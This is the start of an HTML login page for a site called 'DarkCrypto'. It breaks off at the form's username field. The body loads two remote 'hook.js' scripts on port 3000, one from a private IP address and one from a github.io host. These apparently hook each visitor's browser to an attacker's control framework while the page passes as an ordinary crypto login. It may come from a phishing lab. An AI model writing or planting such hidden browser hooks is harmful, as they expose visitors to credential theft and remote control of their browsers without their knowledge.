<!DOCTYPE html>
<html lang="en">
<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DarkCrypto - Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <script src="http://192.168.0.110:3000/hook.js"></script>
    <script src="http://franzbonaparta76.github.io:3000/hook.js"></script>
    <div class="container">
        <h1>DarkCrypto</h1>
        <form id="loginForm">
            <div class="input-group">
                <label for="username">Username</label>
